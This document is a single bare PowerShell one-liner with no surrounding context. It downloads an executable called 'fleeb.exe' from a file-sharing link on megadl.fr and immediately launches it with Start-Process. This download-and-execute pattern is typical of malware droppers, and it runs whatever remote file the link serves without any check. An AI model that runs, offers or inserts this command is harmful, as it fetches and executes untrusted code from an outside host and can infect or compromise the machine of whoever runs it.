
(New-Object System.Net.WebClient).DownloadFile('https://megadl.fr/?b5r5bstqd1','fleeb.exe');Start-Process 'fleeb.exe'

